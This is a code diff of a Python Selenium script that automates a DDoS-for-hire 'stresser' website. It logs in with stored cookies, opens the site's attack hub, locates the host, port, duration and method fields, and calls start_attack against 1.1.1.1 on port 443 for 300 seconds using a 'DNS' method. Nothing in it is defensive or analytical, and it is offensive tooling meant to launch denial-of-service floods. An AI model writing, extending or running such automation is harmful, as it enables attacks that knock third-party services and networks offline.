@@ -4,7 +4,10 @@ from selenium.webdriver.common.by import By
 from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
 from selenium.webdriver.chrome.options import Options
+from selenium.webdriver import ChromeService, FirefoxService
+
 import os
+import logging
 
 
 
@@ -20,28 +23,50 @@ cookies = [
     }
 ]
 
+drivers = {
+    "geckoDriver": "./drivers/geckodriver.exe",
+    "chromeDriver": "./drivers/chromedriver.exe"
+}
 
-webdriver.FirefoxService(log_output="./output.log")
-driver = webdriver.Firefox()
+logger = logging.getLogger('selenium')
+logger.setLevel(logging.DEBUG)
+handler = logging.FileHandler("./debug.log")
+logger.addHandler(handler)
 
 
-class Main():
+firefox_options = webdriver.FirefoxOptions()
+
+#firefox_options.add_argument("--headless")
+
+
+service = FirefoxService(executable_path=drivers["geckoDriver"], log_output="./debug.log")
+
+driver = webdriver.Firefox(service=service, options=firefox_options)
+
+class Pages:
+    def __init__(self) -> None:
+        pass
+
+    def index_page(self) -> None:
+        driver.get("https://www.stressthem.se")
+
+    def login_page(self) -> None:
+        driver.get("https://www.stressthem.se/login")
+
+    def DDoS_page(self) -> None:
+        driver.get("https://www.stressthem.se/hub")
+
+class Main(Pages):
     def __init__(self, driver: webdriver.Chrome) -> None:
         driver.get("https://www.stressthem.se")
         driver.implicitly_wait(0.5)
-        
-        
-        print(driver.page_source)
-        try:
-            self.ip_form = driver.find_element(By.ID, "host")
-            self.port_form = driver.find_element(By.ID, "port")
-            self.time_form = driver.find_element(By.ID, "time")
-            self.method_form = driver.find_element(By.ID, "method")
-        except:
-            pass
+
+
 
     def login_form(self) -> any:
-        driver.get("https://www.stressthem.se/login")
+        self.login_page()
+
+        print(driver.page_source)
         username_form = driver.find_element(By.ID, "username")
         username_form.send_keys(username)
         password_form = driver.find_element(By.ID, "password")
@@ -53,29 +78,21 @@ class Main():
         for cookie in cookies:
             driver.add_cookie(cookie)
 
-    def DDoS_page(self) -> any:
-        driver.get("https://www.stressthem.se/hub")
+    def start_attack(self, ip: str, port: int, time: int, method: str):
+        self.DDoS_page()
+
+        self.ip_form = driver.find_element(By.ID, "host")
+        self.port_form = driver.find_element(By.ID, "port")
+        self.time_form = driver.find_element(By.ID, "time")
+        self.method_form = driver.find_element(By.ID, "method")
 
     def driver_quit(self) -> any:
         driver.quit()
 
 
 
-main = Main(driver=driver)
-main.login_form()
+bot = Main(driver=driver)
+bot.login_form()
+WebDriverWait(driver, 10).until(EC.url_to_be("https://www.stressthem.se/home"))
+bot.start_attack("1.1.1.1", 443, 300, "DNS")
 
-
-
-def test():
-
-    button_element = driver.find_element(By.ID, "id_del_boton")  # Reemplaza con el ID real del botón
-    button_element.click()
-
-    # Espera a que la página se cargue después de hacer clic en el botón (puedes ajustar el tiempo según sea necesario)
-    wait = WebDriverWait(driver, 10)
-    element_after_click = wait.until(EC.presence_of_element_located((By.ID, "id_del_elemento_despues_del_clic")))
-
-    # Puedes realizar más acciones después de hacer clic en el botón
-
-    # Cierra el navegador al finalizar
-    driver.quit()
